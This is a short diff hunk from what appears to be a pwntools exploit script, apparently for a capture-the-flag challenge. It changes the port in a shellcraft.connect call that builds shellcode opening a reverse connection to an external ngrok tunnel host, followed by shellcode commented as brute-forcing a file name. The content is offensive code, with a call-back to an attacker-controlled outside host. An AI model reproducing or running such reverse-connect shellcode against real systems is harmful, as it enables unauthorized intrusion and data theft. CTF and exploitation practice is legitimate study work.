@@ -36,7 +36,7 @@ buf2 = 0x400
 
 #reverse connect and brute force file name
 
-shellcode = shellcraft.connect('4.tcp.ngrok.io', 14417)
+shellcode = shellcraft.connect('4.tcp.ngrok.io', 13964)
 shellcode += '''
     /* brute force file name */
 
